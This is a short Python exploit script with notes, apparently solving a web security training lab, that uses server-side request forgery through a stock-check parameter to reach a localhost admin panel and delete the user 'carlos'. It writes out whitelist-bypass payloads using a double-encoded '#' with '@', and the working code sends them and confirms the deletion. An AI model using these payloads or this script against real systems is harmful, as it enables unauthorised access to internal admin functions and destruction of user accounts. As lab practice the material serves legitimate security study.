# SSRF (Server Side Request Forgery) with whitelist-based inpput filter
'''
Vulnerable feature - stock check functionality

Goal - change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

Analysis:

First try it with @ then add after it # and then try to encode # character with ctrl+u so it is %23, then try it again and then we have %2523@

localhost: http://localhost%2523@stock.weliketoshop.net
admin interface: http://localhost%2523@stock.weliketoshop.net/admin
delete user: http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos 
'''


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Disable insecure request warning

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # Sending proxies to Burp

def delete_user(url):
    delete_user_ssrf_payload = 'http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    #Check if user was deleted
    admin_page_ssrf_payload = 'http://localhost%23@stock.weliketoshop.net/admin'
    params2 = {'stockApi': admin_page_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)

    if 'Carlos' not in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2: # if the length of the parametr that you give to the script is not equal to 2
        print("(+) Usage: %s <url>" % sys.argv[0]) # Print a message usage instruction, print the name of the script and that it takes parametr URL 
        print("(+) Example: %s wwww.example.com" % sys.argv[0]) # Put there example and take the name of the script
        sys.exit(-1)

    url = sys.argv[1] # Take a parametr that the user gave us
    print("(+) Deleting Carlos user...") # Show message that deleting user is in progress
    delete_user(url)

if __name__ == "__main__": # Find name method
    main()
